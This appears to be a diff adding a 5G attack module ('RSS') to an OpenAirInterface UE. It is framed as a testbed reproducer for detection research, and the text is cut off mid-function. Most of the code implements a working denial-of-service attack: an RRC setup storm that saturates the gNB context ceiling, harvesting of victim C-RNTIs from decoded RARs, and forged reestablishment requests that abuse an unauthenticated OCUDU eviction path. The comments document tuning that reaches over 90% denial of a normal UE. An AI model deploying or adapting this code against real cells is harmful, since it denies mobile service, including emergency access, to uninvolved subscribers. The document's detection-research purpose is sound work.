+/* clang-format on */
+
+static bool rss_cfg_done;
+static bool rss_killed;
+static uint64_t rss_t0_ns;
+#define RSS_MAX_UE MAX_NUM_NR_UE_INST
+static unsigned rss_seq[RSS_MAX_UE];
+static unsigned rss_completed;
+static FILE *rss_log_fd;
+static bool rss_got_msg4[RSS_MAX_UE]; /* did the current attempt reach Msg4? */
+/* Closed-loop occupancy control.
+   The occupancy the gNB sees is N = (incomplete attempts started in the last
+   T_hold). The UE can count that itself: every attempt we leave incomplete
+   holds one context for exactly hold_ms. So target_occupancy becomes a real
+   knob without any feedback from the gNB: below target we keep attacking,
+   at target we idle. Measured 2026-10-20: interval_ms alone cannot do this,
+   because the realised Msg4 rate saturates near 3.8/s regardless of interval. */
+#define RSS_OCC_WINDOW 512
+static uint64_t rss_skip_ts[RSS_OCC_WINDOW];
+static unsigned rss_skip_head;
+static unsigned rss_occ_hold_logs;
+static unsigned rss_gate_logs;
+/* Probe bookkeeping: a probe is the measurement for "can a normal UE still
+   connect", so it retries like a real UE instead of making one attempt. The
+   first probe runs produced RRCSetupComplete counts of 5/1/2/0/0 with
+   attempt_start == 1, i.e. a single Bernoulli trial against a 35% ceiling
+   dwell, which is noise rather than a measurement. */
+static unsigned rss_probe_tries[RSS_MAX_UE];
+static uint64_t rss_probe_t0[RSS_MAX_UE];
+static uint64_t rss_probe_next_ns[RSS_MAX_UE];
+static bool rss_probe_done[RSS_MAX_UE];
+static uint64_t rss_gate_since_ns;   /* when a gate first held this attempt back */
+static unsigned rss_ticks;       /* RRC ticks seen while enabled */
+static uint64_t rss_tick_t0_ns;  /* start of the current tick-rate window */
+/* Air time. One RRC tick is one radio frame (10 ms of air). The ZMQ device has
+   no pacing code and OAI selects TIME_SOURCE_REALTIME for it (virtual
+   IQ-driven time is only used for --rfsim), so the radio is *expected* to run
+   in real time. On this testbed it does not: the frame counter advances about
+   3-6x slower than the wall clock, while the gNB release timer stays on the
+   wall clock. Every record therefore carries both clocks, so a reader can tell
+   "attempts per second of air time" from "attempts per second of wall time".
+   Without that split the labels understate a real attacker by the same factor
+   and would mislead detection thresholds. */
+static uint64_t rss_air_frame;   /* monotonic radio frame = hfn*1024 + frame */
+static uint64_t rss_air_frame_t0;
+
+static uint64_t rss_now_ns(void)
+{
+  struct timespec ts;
+  clock_gettime(CLOCK_REALTIME, &ts);
+  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
+}
+
+static const rss_cfg_t *rss_get_cfg(void)
+{
+  if (!rss_cfg_done) {
+    paramdef_t params[] = RSS_PARAMS_DESC;
+    config_get(config_get_if(), params, sizeofArray(params), RSS_CFG_PREFIX);
+    rss_cfg_done = true;
+    /* interval_ms 0 is allowed and means "on the next tick", i.e. max rate.
+       The floor is then the RA cycle itself (PRACH occasion + RAR + Msg3 + Msg4). */
+    if (rss_cfg.interval_ms < 0)
+      rss_cfg.interval_ms = 0;
+    if (rss_cfg.reject_backoff_ms < 10)
+      rss_cfg.reject_backoff_ms = 10;
+    rss_cfg.completion_pct = rss_cfg.completion_pct < 0 ? 0 : (rss_cfg.completion_pct > 100 ? 100 : rss_cfg.completion_pct);
+    if (rss_cfg.enable) {
+      LOG_W(NR_RRC,
+            "[RSS] A-type reproducer ENABLED (isolated testbed only): interval=%d ms completion=%d%% "
+            "honor_reject=%d ack_gate=%d max_duration=%d s run_id=%s log=%s\n",
+            rss_cfg.interval_ms,
+            rss_cfg.completion_pct,
+            rss_cfg.honor_reject,
+            rss_cfg.ack_gate,
+            rss_cfg.max_duration_s,
+            rss_cfg.run_id,
+            rss_cfg.log_file);
+    }
+  }
+  return &rss_cfg;
+}
+
+bool nr_rss_enabled(void)
+{
+  return rss_get_cfg()->enable != 0 && !rss_killed;
+}
+
+/* Probe instances behave as ordinary UEs instead of storming: they process
+   RRCSetup normally, send RRCSetupComplete and stay in CONNECTED. Instance 0
+   gets the uicc0 config section (openair3/UICC/usim_interface.c looks up
+   "uicc%d" by Mod_id), which is the only subscriber provisioned in the core,
+   so the probe is the one instance that can actually register.
+   This is the measurement instrument for the success criterion "a normal UE
+   cannot connect or communicate": the reject-gap metric was only a proxy and
+   was never validated against a real UE attempt. */
+int nr_rss_probe_ues(void)
+{
+  const int k = rss_get_cfg()->probe_ues;
+  static int logged;
+  if (!logged) {
+    logged = 1;
+    LOG_W(NR_RRC, "[RSS] probe_ues knob = %d\n", k);
+  }
+  return k < 0 ? 0 : k;
+}
+
+/* RA-only probe: the probe connects on its first try and then stays connected,
+   so it never faces gate 1 (PRACH) or gate 2 (RAR/contention) again - the
+   measurement walks around the attack. Measured 2026-10-22: the probe logged
+   1-2 attempts per run while the storm logged hundreds, so RAR hijacking
+   (100-200 steals in 17 s) almost never hit the probe's own RAR.
+   In this mode the probe skips Msg5 like a storm instance, so it redoes RA
+   continuously, and msg4_rx / attempt_start for ue=0 becomes its RA success
+   rate - a direct measure of gate 1 and gate 2. It stays excluded from the
+   attack knobs themselves (hijack, preamble flood). */
+/* Unauthenticated eviction via the reestablishment reject path.
+   OCUDU `rrc_ue_impl::handle_rrc_reest_request` (lib/rrc/ue/rrc_ue_message_handlers.cpp
+   :118-140, read on the installed build) takes this branch when the DU could not serve
+   the new UE and therefore sent an empty DU-to-CU container:
+
+     if (du_to_cu_container.empty()) {
+       old = cu_cp_notifier.on_rrc_reestablishment_request(msg...ue_id.pci,
+                                                           to_rnti(msg...ue_id.c_rnti));
+       cu_cp_notifier.on_rrc_reestablishment_failure({.ue_index = old.ue_index, ...});
+       logger.log_warning("Sending rrcReject. Cause: DU is not able to serve the UE");
+
+   The old UE is looked up by (PCI, C-RNTI) alone and released. `verify_short_mac_i`
+   exists but only on the normal path (rrc_reestablishment_procedure.cpp:262), which this
+   branch returns before reaching. The project's own methodology.md:140 recorded the same
+   read and flagged it as a scope-review candidate; it was never connected to this goal.
+
+   The A-type storm is what creates the precondition: all 6,564 reject lines in the
+   artifacts carry exactly this branch's cause string. So the storm opens the door and the
+   forged reestablishment walks a third party out of it.
+
+   Targeting: the DU hands out C-RNTIs from a narrow range (0x4601, 0x4602, 0x4604, ...
+   in the logs), so a sweep over a few hundred values covers every live UE within seconds
+   at the measured ~60 attempts/s. No knowledge of the victim is needed, which is why this
+   is an attacker capability and not a testbed concession.
+
+   Probe instances never do this - they are the measurement. */
+/* Division of labour. The eviction branch only runs when the DU could not serve the new
+   UE, i.e. when occupancy is at the ceiling - and the storm is what puts it there. A
+   forged reestablishment REPLACES a setup request, so an instance doing eviction creates
+   no context. Measured 2026-10-22: making every non-probe instance forge dropped the
+   storm to 14.6/s, occupancy never reached 96, the DU served the requests normally and
+   they went down the path that DOES verify shortMAC-I. Nobody was left holding the door
+   open. So only the highest-numbered instances forge; the rest keep filling the ceiling. */
+/* The sweep is diluted by the attacker's own contexts. Measured 2026-10-22: 125 forged
+   reestablishment requests produced 21 `Requesting UE context release for old_ue` lines
+   at the CU, but ~95 of the ~96 live contexts were the storm's own, so a blind sweep hit
+   the single victim about 1% of the time. In a real cell those 96 would be victims, so
+   the dilution is an artifact of a one-victim testbed, not of the attack.
+   It is also removable without knowing anything about the victim: the attacker knows the
+   C-RNTIs it was itself assigned, so it skips those. What remains in the range is, by
+   construction, somebody else. */
+/* Harvested victim C-RNTIs.
+   This cell has a single PRACH occasion, so RA-RNTI is the same for every UE and the
+   attacker already decodes every RAR, including the ones answering other UEs' preambles.
+   Each RAR carries the TC-RNTI the gNB just minted, which becomes that UE's C-RNTI on a
+   successful RA. Recording the TC-RNTIs from RARs whose RAPID is not ours turns the
+   eviction sweep from blind enumeration into direct targeting, with no prior knowledge of
+   the victim - the attacker learns the identity from the air.
+   Measured 2026-10-22 without this: 20 forged requests over 39 s against a 256-wide
+   sweep, ~3.6% ceiling dwell, so the chance of hitting one specific victim was ~0.3%. */
+#define RSS_HARVEST_MAX 256
+static unsigned rss_harvest[RSS_HARVEST_MAX];
+static unsigned rss_harvest_n;
+static unsigned rss_harvest_head;
+static uint64_t rss_harvest_ts[RSS_HARVEST_MAX];
+/* Highest C-RNTI ever seen in a decoded RAR. The gNB allocates C-RNTIs
+   sequentially and the value drifts between runs - measured 2026-10-22, the
+   victim sat at 0x4611/0x464a in one run and 0x4719/0x47ab in another, so the
+   static sweep range (0x4600..0x4640) had become a dead range. Tracking the
+   allocator lets the sweep follow it. Our own instances attach constantly, so
+   this stays close to whatever the gNB is handing out right now. */
+static unsigned rss_crnti_seen_max;
+
+void nr_rss_note_victim_crnti(unsigned crnti)
+{
+  if (crnti == 0 || nr_rss_is_own_crnti(crnti))
+    return;
+  for (unsigned i = 0; i < rss_harvest_n; i++)
+    if (rss_harvest[i] == crnti) {
+      /* Re-seen: refresh so a victim that keeps reattaching stays fresh while a
+         C-RNTI that is gone for good ages out of the eligible window. */
+      rss_harvest_ts[i] = rss_now_ns();
+      return;
+    }
+  if (crnti > rss_crnti_seen_max)
+    rss_crnti_seen_max = crnti;
+  rss_harvest[rss_harvest_head] = crnti;
+  rss_harvest_ts[rss_harvest_head] = rss_now_ns();
+  rss_harvest_head = (rss_harvest_head + 1) % RSS_HARVEST_MAX;
+  if (rss_harvest_n < RSS_HARVEST_MAX)
+    rss_harvest_n++;
+}
+
+/* Returns 0 when nothing has been harvested yet, so the caller falls back to the sweep. */
+int nr_rss_evict_min_age_ms(void)
+{
+  const int m = rss_get_cfg()->evict_min_age_ms;
+  return m < 0 ? 0 : m;
+}
+
+int nr_rss_evict_max_age_ms(void)
+{
+  const int m = rss_get_cfg()->evict_max_age_ms;
+  return m <= 0 ? 1000000 : m;
+}
+
+int nr_rss_evict_sticky_ms(void)
+{
+  const int m = rss_get_cfg()->evict_sticky_ms;
+  return m < 0 ? 0 : m;
+}
+
+/* sticky victim state, shared by nr_rss_pick_victim_crnti() and its setter */
+static unsigned sticky;
+static uint64_t sticky_since;
+static void rss_sticky_set(unsigned c) { sticky = c; sticky_since = rss_now_ns(); }
+
+unsigned nr_rss_pick_victim_crnti(void)
+{
+  /* Newest first, not round-robin. A blind sweep cannot win here: the live
+     C-RNTI range is ~211 wide (0x4601..0x46d3 observed) and the entire eviction
+     budget is bounded by RA throughput (~54/s measured), so one full pass takes
+     ~21 s while a normal UE reattaches in 200-600 ms. Round-robin over the
+     harvest ring had the same dilution - 1,369 targeted attempts spread about 5
+     hits per value over 41 s, and a normal UE slipped through with a working PDU
+     session (ue=300, 2026-10-22). Spending the whole budget on the most recently
+     harvested identity puts it on whoever just attached, which is what a
+     targeted attacker would do and what sustained denial requires. */
+  /* Stick to one victim. Newest-first alone wandered: with six evictors all
+     harvesting, newer non-own C-RNTIs keep displacing the live victim, so fire
+     drifts off it. Measured 2026-10-22 (m_foc2): the probe kept a PDU session
+     for 12.8 s while 743 targeted requests were in flight. A targeted attacker
+     instead hammers one identity until it stops coming back. Refresh every
+     RSS_STICKY_MS so a victim that has gone away is replaced - that cadence has
+     to track how fast a normal UE reattaches (200-600 ms measured). */
+  /* evict_sticky_ms == 0 selects round-robin over non-own entries, which is the
+     default because sticking was measured to be worse. With own-filtering
+     working the ring holds only a couple of non-own identities, so sticking
+     parks the whole budget on whichever one is newest - and if that identity is
+     stale the budget is wasted. Measured 2026-10-22 (q_t2): 1,619 of 1,740
+     forged requests went to 0x4676, a C-RNTI that no longer existed, and only
+     105 (6.0%) named the live victim. Rotating over the non-own entries gives
+     the live victim a fair share instead. */
+  if (nr_rss_evict_sticky_ms() == 0) {
+    static unsigned cursor;
+    if (rss_harvest_n == 0)
+      return 0;
+    const uint64_t now = rss_now_ns();
+    const uint64_t lo_ns = (uint64_t)nr_rss_evict_min_age_ms() * 1000000ULL;
+    const uint64_t hi_ns = (uint64_t)nr_rss_evict_max_age_ms() * 1000000ULL;
+    for (unsigned guard = 0; guard < rss_harvest_n; guard++) {
+      const unsigned slot = cursor++ % rss_harvest_n;
+      const unsigned c = rss_harvest[slot];
+      /* Eligible only inside an age window. Too young means one of our own
+         evictor instances has not registered its C-RNTI yet (the harvest sees
+         every RAR, so roughly 42 of our own per second enter the ring against
+         the victim's 0.2/s). Too old means the identity is gone: measured
+         2026-10-22 (q_t2), 1,619 of 1,740 forged requests went to 0x4676, a
+         C-RNTI that no longer existed, while only 105 (6.0%) named the live
+         victim - and those 105 alone produced 94.7% denial. A live victim is
+         re-harvested on every reattach, so it stays inside the window. */
+      const uint64_t age = now - rss_harvest_ts[slot];
+      if (age < lo_ns || age > hi_ns)
+        continue;
+      if (c != 0 && !nr_rss_is_own_crnti(c))
+        return c;
+    }
+    return 0;
+  }
+  {
+    const uint64_t now = rss_now_ns();
+    /* The hold has to be SHORTER than a normal UE takes to reach the user
+       plane, or targeting arrives after it is already served. Measured
+       2026-10-22: ICS at +41..+453 ms, PDU at +306..+661 ms, and with a
+       1000 ms hold the forged request naming the victim arrived 2.07 s
+       after it attached (q_t2 ue=1623, which kept a PDU session 2.07 s). */
+    const uint64_t hold_ns = (uint64_t)nr_rss_evict_sticky_ms() * 1000000ULL;
+    if (sticky != 0 && !nr_rss_is_own_crnti(sticky)
+        && now - sticky_since < hold_ns)
+      return sticky;
+    sticky = 0;
+    sticky_since = now;
+  }
+  if (rss_harvest_n == 0)
+    return 0;
+  /* liveness gate on the sticky path. Sticking supplies CONTINUITY, which is
+     what actually produced denial: measured 2026-10-22, q_t2 reached 5.3%
+     availability with only 6.0% aim because its 105 probe-aimed requests
+     landed continuously on one live victim, while dispersing aim to 73.6% by
+     rotating made denial WORSE (x_t1, 77.5%). But sticking without a liveness
+     check parked 93% of the budget on 0x4676, a C-RNTI that no longer existed.
+     The age window supplies liveness, so the two belong together - this path
+     had no age gate before, which is why the combination was never tested. */
+  const uint64_t pick_now = rss_now_ns();
+  const uint64_t pick_lo = (uint64_t)nr_rss_evict_min_age_ms() * 1000000ULL;
+  const uint64_t pick_hi = (uint64_t)nr_rss_evict_max_age_ms() * 1000000ULL;
+  for (unsigned back = 1; back <= rss_harvest_n; back++) {
+    const unsigned idx = (rss_harvest_head + RSS_HARVEST_MAX - back) % RSS_HARVEST_MAX;
+    const unsigned c = rss_harvest[idx];
+    const uint64_t age = pick_now - rss_harvest_ts[idx];
+    if (age < pick_lo || age > pick_hi)
+      continue;
+    if (c != 0 && !nr_rss_is_own_crnti(c)) {
+      rss_sticky_set(c);
+      return c;
+    }
+  }
+  return 0;
+}
+
+#define RSS_OWN_MAX 4096
+static uint8_t rss_own_crnti[RSS_OWN_MAX / 8];
+
+void nr_rss_note_own_crnti(int ue, unsigned crnti)
+{
+  /* Probe instances are the victim, not the attacker. They live in the same process only
+     because this testbed has one radio, so a process-global "own" set would classify the
+     victim as friendly and the harvest would discard exactly the identity it needs.
+     Measured 2026-10-22: with the probe registering here, the harvest ring stayed empty
+     and every eviction fell back to blind sweeping (targeted = 0 in all runs). */
+  if (nr_rss_is_probe(ue))
+    return;
+  const unsigned i = crnti % RSS_OWN_MAX;
+  rss_own_crnti[i / 8] |= (uint8_t)(1u << (i % 8));
+}
+
+bool nr_rss_is_own_crnti(unsigned crnti)
+{
+  const unsigned i = crnti % RSS_OWN_MAX;
+  return (rss_own_crnti[i / 8] >> (i % 8)) & 1u;
+}
+
+bool nr_rss_is_evictor(int ue, int n_ue)
+{
+  const int k = rss_get_cfg()->evict_ues;
+  if (k <= 0 || rss_get_cfg()->evict_crnti_hi <= 0)
+    return false;
+  return ue >= n_ue - k;
+}
+
+/* Adaptive sweep bounds. Falls back to the configured lo..hi when adaptive is
+   off or nothing has been observed yet. The window sits just below the highest
+   observed C-RNTI because that is where the allocator just handed values out,
+   which is where a UE that attached moments ago lives. Keeping it narrow
+   matters: at r requests/s a window of w is revisited every w/r seconds, and a
+   normal UE reaches its PDU session in 238..715 ms (measured), so a wide window
+   lets it slip through. */
+unsigned nr_rss_sweep_lo(void)
+{
+  const rss_cfg_t *c = rss_get_cfg();
+  if (c->evict_adaptive == 0 || rss_crnti_seen_max == 0)
+    return (unsigned)(c->evict_crnti_lo > 0 ? c->evict_crnti_lo : 1);
+  const unsigned w = (unsigned)(c->evict_window > 0 ? c->evict_window : 32);
+  return rss_crnti_seen_max > w ? rss_crnti_seen_max - w : 1;
+}
+
+unsigned nr_rss_sweep_hi(void)
+{
+  const rss_cfg_t *c = rss_get_cfg();
+  if (c->evict_adaptive == 0 || rss_crnti_seen_max == 0)
+    return (unsigned)(c->evict_crnti_hi > 0 ? c->evict_crnti_hi : 1);
+  return rss_crnti_seen_max + 8;
+}
+
+int nr_rss_evict_lo(void)
+{
+  return rss_get_cfg()->evict_crnti_lo;
+}
+
+int nr_rss_evict_hi(void)
+{
+  return rss_get_cfg()->evict_crnti_hi;
+}
+
+int nr_rss_evict_pci(void)
+{
+  return rss_get_cfg()->evict_pci;
+}
+
+bool nr_rss_probe_ra_only(void)
+{
+  return rss_get_cfg()->probe_ra_only != 0;
+}
+
+/* The probe is instrumentation, not the attack. With no delay it starts its RA
+   at the same instant the attackers do and completes attach in 174..326 ms
+   (measured) while the evictors are still spinning up, so it wins its first race
+   by construction and is then immune - the eviction path only works within about
+   2..7 s of attach (120/120 evictions, max 7.16 s, measured 2026-10-22). That
+   biased every run in the victim's favour. Delaying the probe models the case
+   the goal actually describes: a normal UE arriving at a cell that is already
+   under attack. It never makes the probe's attach fail - it only changes when
+   the probe first asks. */
+int nr_rss_probe_delay_ms(void)
+{
+  const int m = rss_get_cfg()->probe_delay_ms;
+  return m < 0 ? 0 : m;
+}
+
+bool nr_rss_probe_withheld(int ue)
+{
+  if (!nr_rss_is_probe(ue) || nr_rss_probe_delay_ms() == 0 || rss_t0_ns == 0)
+    return false;
+  return rss_now_ns() - rss_t0_ns < (uint64_t)nr_rss_probe_delay_ms() * 1000000ULL;
+}
+
+bool nr_rss_is_probe(int ue)
+{
+  return ue >= 0 && ue < nr_rss_probe_ues();
+}
+
+int nr_rss_anas_ues(void)
+{
+  const int n = rss_get_cfg()->anas_ues;
+  return n < 0 ? 0 : n;
+}
+
+/* A-NAS holders sit just above the probes, so they never collide with the
+   evictors, which are taken from the top (nr_rss_is_evictor).
+   WHY: A-type never sends Msg5, so a context lives exactly the gNB's
+   t300 + rrc_procedure_guard_time_ms (measured 2,197 ms) and occupancy is
+   capped at accept_rate x hold = 42.5 x 2.197 = 93.4 against a ceiling of 96 --
+   3% short, on a rate the gNB pins. Sending Msg5 cancels that guard: a
+   completed context has no expiry, so a holder connects once and simply stays.
+   With H holders the A-type storm only has to cover 96 - H, which it already
+   can from H >= 3. No restart is involved, so this avoids the release-from-
+   timer path that crashed the UE on 2026-10-20 (run SAT-1019T220108Z). */
+bool nr_rss_is_anas(int ue)
+{
+  const int lo = nr_rss_probe_ues();
+  const int n = nr_rss_anas_ues();
+  return n > 0 && ue >= lo && ue < lo + n;
+}
+
+/* A-NAS churn. The NGAP guard OCUDU applies is purely time based -- measured
+   2026-10-22: "UE did not request a PDU session after 3000ms. Releasing UE from
+   DU" -- so the gNB holds a completed context for 3 s whether or not we keep
+   the link alive. Staying connected therefore buys nothing and costs a UE
+   instance, which capped A-NAS occupancy at the instance count (<= 32).
+   Starting a fresh RA right after Msg5 instead makes occupancy rate x hold
+   again: 42.5/s x 3.143 s = 133 against a ceiling of 96.
+   rss_poll() ends in handle_t300_expiry() with no RRC-state guard, so the new
+   RA proceeds from RRC_CONNECTED without any teardown -- this deliberately
+   avoids the UE-initiated release that crashed the UE on 2026-10-20
+   (SAT-1019T220108Z). The gap must clear Msg5 on the air first: measured
+   Msg3->Msg5 at the CU was 21.7 ms, so the 80 ms default has ~3.7x margin. */
+int nr_rss_anas_gap_ms(void)
+{
+  const int g = rss_get_cfg()->anas_gap_ms;
+  return g < 0 ? 0 : g;
+}
+
+/* Harvester role. Coverage - the chance we hold the victim's C-RNTI inside its
+   2..7 s eviction window - is the measured bottleneck: about 1/3, which bounds
+   availability at >= 1 - coverage (observed 77..99.7%). We only decode a
+   victim's RAR when we sent a preamble in the SAME PRACH occasion, because
+   RA-RNTI is derived from the occasion. Occasions run at 100/s but our RA tops
+   out near 50/s, since every instance pays for the whole
+   preamble->RAR->Msg3->Msg4 cycle.
+   A harvester pays only for preamble->RAR, which is all harvesting needs, so it
+   can occupy far more occasions. It creates no gNB context (that is why
+   msg4_wait=0 was written off as "no load") - here that is the point. Evictors
+   stay separate because the forged request IS the Msg3 payload, which a
+   harvester never sends. Layout: probe | anas | harvesters | evictors(top). */
+int nr_rss_harvest_ues(void)
+{
+  const int n = rss_get_cfg()->harvest_ues;
+  return n < 0 ? 0 : n;
+}
+
+bool nr_rss_is_harvester(int ue)
+{
+  const int lo = nr_rss_probe_ues() + nr_rss_anas_ues();
+  const int n = nr_rss_harvest_ues();
+  return n > 0 && ue >= lo && ue < lo + n;
+}
+
+bool nr_rss_honor_reject(void)
+{
+  return rss_get_cfg()->honor_reject != 0;
+}
+
+/* How many RA procedures one UE instance may run at once. The MAC clamps this
+   to NR_UE_MAX_PARALLEL_RA; 1 reproduces upstream exactly. */
+int nr_rss_ra_depth(void)
+{
+  const int d = rss_get_cfg()->ra_depth;
+  return d < 1 ? 1 : d;
+}
+
+int nr_rss_reject_backoff_ms(void)
+{
+  return rss_get_cfg()->reject_backoff_ms;
+}
+
+void nr_rss_log(int ue, const char *event, const char *fmt, ...)
+{
+  const rss_cfg_t *cfg = rss_get_cfg();
+  if (!cfg->enable || !cfg->log_file || !cfg->log_file[0])
+    return;
+  if (!rss_log_fd) {
+    rss_log_fd = fopen(cfg->log_file, "a");
+    if (!rss_log_fd) {
+      LOG_E(NR_RRC, "[RSS] cannot open %s for writing\n", cfg->log_file);
+      return;
+    }
+  }
+  fprintf(rss_log_fd,
+          "{\"type\":\"event\",\"run_id\":\"%s\",\"ue\":%d,\"seq\":%u,\"t_ns\":%llu,\"air_ms\":%llu,\"event\":\"%s\"",
+          cfg->run_id ? cfg->run_id : "",
+          ue < 0 || ue >= RSS_MAX_UE ? 0 : ue,
+          rss_seq[ue < 0 || ue >= RSS_MAX_UE ? 0 : ue],
+          (unsigned long long)rss_now_ns(),
+          (unsigned long long)(rss_air_frame * 10),
+          event);
+  if (fmt && fmt[0]) {
+    va_list ap;
+    va_start(ap, fmt);
+    fputc(',', rss_log_fd);
+    vfprintf(rss_log_fd, fmt, ap);
+    va_end(ap);
+  }
+  fprintf(rss_log_fd, "}\n");
+  fflush(rss_log_fd);
+}
+
+unsigned nr_rss_next_seq(int ue)
+{
+  if (ue < 0 || ue >= RSS_MAX_UE)
+    ue = 0;
+  if (rss_t0_ns == 0)
+    rss_t0_ns = rss_now_ns();
+  /* Close out the previous attempt. An attempt that never saw Msg4 means the
+     gNB did not answer or the contention was lost. Under saturation this
+     fraction is the denial signal we can read without a second UE. */
+  if (rss_seq[ue] > 0 && !rss_got_msg4[ue])
+    nr_rss_log(ue, "attempt_end", "\"actual_reach\":\"no_msg4\"");
+  rss_got_msg4[ue] = false;
+  return ++rss_seq[ue];
+}
+
+/* Should the attempt wait for Msg4 before restarting?
+ *
+ * Measured 2026-10-20 (60 s runs, single UE, default gNB config): the attempt
+ * cycle is pinned at 40 ms of air time and 30 ms of it, 78% of the wall cost,
+ * is the wait between Msg3 and Msg4. The gNB has already created the UE context
+ * and started "RRC Setup Procedure" when it decoded Msg3, so that wait buys the
+ * attacker nothing. msg4_wait=0 abandons the attempt once Msg3 is on the air.
+ *
+ * This is a VARIANT of A-type, not A-type: Msg4 is never accepted or ACKed, so
+ * the gNB also retransmits rrcSetup over DL HARQ. Runs must be labelled with
+ * the knob value, which run.json records.
+ */
+bool nr_rss_wait_for_msg4(void)
+{
+  return rss_get_cfg()->msg4_wait != 0;
+}
+
+void nr_rss_note_msg4(int ue)
+{
+  if (ue < 0 || ue >= RSS_MAX_UE)
+    ue = 0;
+  rss_got_msg4[ue] = true;
+}
+
+void nr_rss_note_skip(void)
+{
+  rss_skip_ts[rss_skip_head] = rss_now_ns();
+  rss_skip_head = (rss_skip_head + 1) % RSS_OCC_WINDOW;
+}
+
+unsigned nr_rss_occupancy(void)
+{
+  const uint64_t hold_ns = (uint64_t)rss_get_cfg()->hold_ms * 1000000ULL;
+  const uint64_t now = rss_now_ns();
+  unsigned n = 0;
+  for (unsigned i = 0; i < RSS_OCC_WINDOW; i++)
+    if (rss_skip_ts[i] != 0 && now - rss_skip_ts[i] < hold_ns)
+      n++;
+  return n;
+}
+
+/* A completed attempt leaves RRC in CONNECTED, and a new RRCSetupRequest is
+   only sent from RRC_IDLE, so the loop stops there. Releasing the connection
+   from this timer was tried on the box 2026-10-20 and crashed the UE right
+   after the release (probe_release -> resync -> SIGSEGV, run SAT-1019T220108Z),
+   so that path is removed. completion_pct > 0 therefore ends the run at its
+   first completed attempt and is only useful for one-shot checks.
+   Denial does not need it: once the cell is full the gNB answers an ordinary
+   RRCSetupRequest with RRCReject, which is logged as actual_reach=rrc_reject
+   and is exactly what a legitimate UE would receive. */
+
+/* Deterministic stride instead of a coin flip: the realised completion ratio is
+   exact and the same run is replayable for the detection team. */
+bool nr_rss_complete_this_attempt(void)
+{
+  const rss_cfg_t *cfg = rss_get_cfg();
+  if (cfg->completion_pct <= 0)
+    return false;
+  if (cfg->completion_pct >= 100)
+    return true;
+  unsigned due = (rss_seq[0] * (unsigned)cfg->completion_pct) / 100;
+  if (due > rss_completed) {
+    rss_completed = due;
+    return true;
+  }
+  return false;
+}
+
+/* Box measurement 2026-10-20: a 100 ms target armed with nr_timer_setup() fired
+   after 306 ms (median of 71 attempts). nr_timer_tick() adds a fixed 10 ms per
+   call, but one call is one radio-frame message, and over the ZMQ path those do
+   not arrive every 10 ms. Counting ticks therefore multiplies the whole knob by
+   the tick error. A wall-clock deadline bounds the error at one tick instead of
+   accumulating it, so the timer below is only a once-per-tick poll. */
+/* Spread the instances across the gNB's hold time, once.
+ *
+ * Why: the gNB holds every incomplete context for exactly t300 + guard (box
+ * measured 1999 ms median, p90 2000 ms), so the arrival pattern is copied onto
+ * the release pattern 2 s later. Instances that fire together therefore free
+ * their slots together, occupancy drops below the cell's ceiling, and the
+ * rejection stream stops until the cell refills. Box measured 2026-10-21 at
+ * 6 UE: 25% of rejection gaps exceeded 100 ms and the longest was 1130 ms,
+ * while attempts kept arriving at ~41/s throughout the gaps.
+ *
+ * The offset is applied ONLY to an instance's first arming. Adding it to every
+ * retry would lengthen that instance's cycle permanently and cost demand; one
+ * shift sets the phase and the cycles then drift on their own.
+ *
+ * REFUTED on the box 2026-10-21. Same build, same session, warm-up run first,
+ * 6 UE, 90 s each: stagger on 1431 attempts (15.9/s) and 0 attempts on a repeat,
+ * stagger off 5468 attempts (60.8/s). Default is therefore OFF.
+ *
+ * Why it cannot work in this design: rss_flush_locked() in nr-ue-ru.c emits the
+ * merged uplink batch when wr_joined >= n_ue, i.e. the shared transmit path
+ * assumes every instance contributes to every slot. Staggering makes instances
+ * deliberately idle at different times, so the batch never completes and the
+ * whole TX cadence breaks. The same assumption killed RSS_SHARE_WR_MONOTONIC
+ * and the bounded join wait: anything that breaks the per-slot batch premise
+ * collapses the attempt rate. Set RSS_PHASE_STAGGER=1 to reproduce. */
+static bool rss_phase_done[RSS_MAX_UE];
+
+static uint64_t rss_phase_offset_ns(int ue, int hold_ms)
+{
+  static int cached = -1;
+  if (cached < 0) {
+    const char *env = getenv("RSS_PHASE_STAGGER");
+    cached = env ? (atoi(env) != 0) : 0; /* refuted: default off */
+  }
+  if (!cached || ue < 0 || ue >= RSS_MAX_UE || rss_phase_done[ue])
+    return 0;
+  rss_phase_done[ue] = true;
+  int n = NB_UE_INST > 0 ? NB_UE_INST : 1;
+  if (n <= 1)
+    return 0;
+  return (uint64_t)ue * (uint64_t)hold_ms * 1000000ULL / (uint64_t)n;
+}
+
+void nr_rss_arm_retry(NR_UE_RRC_INST_t *rrc, int delay_ms)
+{
+  const rss_cfg_t *cfg = rss_get_cfg();
+  NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
+  int d = delay_ms > 0 ? delay_ms : cfg->interval_ms;
+  uint64_t phase = rss_phase_offset_ns((int)rrc->ue_id, cfg->hold_ms);
+  if (phase)
+    LOG_I(NR_RRC, "[RSS] ue=%d phase offset %llu ms (hold %d ms / %d UE)\n",
+          (int)rrc->ue_id, (unsigned long long)(phase / 1000000ULL), cfg->hold_ms, NB_UE_INST);
+  tac->rss_deadline_ns = rss_now_ns() + (uint64_t)d * 1000000ULL + phase;
+  nr_timer_setup(&tac->rss_retry_timer, 10, 10);
+  nr_timer_start(&tac->rss_retry_timer);
+}
+
+static void rss_poll(NR_UE_RRC_INST_t *rrc)
+{
+  NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
+  NR_timer_t *t = &tac->rss_retry_timer;
+  const rss_cfg_t *cfg = rss_get_cfg();
+
+  /* Tick-rate instrumentation. One call here is one radio frame, nominally
+     10 ms. Logging the measured value turns the "configured vs realised"
+     mismatch from a guess into a number. */
+  rss_air_frame = (uint64_t)rrc->current_hfn * 1024 + (uint64_t)rrc->current_frame;
+  if (cfg->enable) {
+    uint64_t now = rss_now_ns();
+    rss_ticks++;
+    if (rss_tick_t0_ns == 0) {
+      rss_tick_t0_ns = now;
+      rss_air_frame_t0 = rss_air_frame;
+    } else if (cfg->tick_report > 0 && rss_ticks % (unsigned)cfg->tick_report == 0) {
+      double wall_ms = (double)(now - rss_tick_t0_ns) / 1e6;
+      double air_ms = (double)((rss_air_frame - rss_air_frame_t0) * 10);
+      nr_rss_log((int)rrc->ue_id, "tick_rate",
+                 "\"ms_per_tick\":%.2f,\"nominal_ms\":10,\"air_ms_elapsed\":%.0f,"
+                 "\"wall_ms_elapsed\":%.0f,\"air_per_wall\":%.3f",
+                 wall_ms / (double)cfg->tick_report,
+                 air_ms,
